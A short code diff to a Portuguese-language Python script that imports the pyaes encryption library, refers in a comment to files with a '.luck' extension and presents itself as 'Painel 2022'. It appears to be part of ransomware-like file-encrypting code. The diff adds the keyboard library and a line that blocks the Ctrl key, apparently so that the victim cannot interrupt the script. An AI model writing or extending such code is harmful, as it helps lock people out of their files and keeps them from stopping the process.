@@ -1,6 +1,9 @@
 import os
 import pyaes
 from random import randint
+import keyboard
+
+
 #
 #
 # p = 'teste.txt.luck.luck'
@@ -23,6 +26,7 @@ from random import randint
 from os import chdir, getcwd, listdir
 from os.path import isfile
 
+keyboard.block_key("ctrl")
 
 print(" Painel 2022 - Iniciando, aguarde")
 chdir('..')
